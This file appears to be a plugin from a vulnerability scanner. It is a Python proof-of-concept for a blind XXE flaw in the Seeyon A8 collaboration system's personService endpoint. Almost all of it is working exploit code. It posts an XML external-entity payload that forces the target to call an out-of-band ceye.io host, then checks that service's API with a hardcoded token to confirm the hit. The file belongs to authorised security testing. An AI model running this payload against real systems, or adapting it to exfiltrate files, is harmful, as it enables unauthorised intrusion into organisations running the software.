#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友致远A8协同系统 Blind XML实体注入
referer: http://www.wooyun.org/bugs/wooyun-2016-0167778
author: Lucifer
description: personService文件存在XXE漏洞。
'''
import sys
import time
import json
import hashlib
import datetime
import requests



class yonyou_a8_personService_xxe_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            "SOAPAction":"urn:delete",
            "Content-Type":"application/xml"
        }
        payload = "/seeyon/services/personService.personServiceHttpSoap11Endpoint"
        vulnurl = self.url + payload
        time_stamp = time.mktime(datetime.datetime.now().timetuple())
        m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
        md5_str = m.hexdigest()
        post_data = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://dx3hbm.ceye.io/'+md5_str+'">%remote;]>'
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            eye_url = "http://api.ceye.io/v1/records?token=c04665a158430a100ed655f9c710e597&type=request"
            time.sleep(6)
            reqr = requests.get(eye_url, timeout=10, verify=False)
            if md5_str in reqr.text:
                return "[+]存在用友致远A8协同系统 Blind XML实体注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = yonyou_a8_personService_xxe_BaseVerify(sys.argv[1])
    testVuln.run()
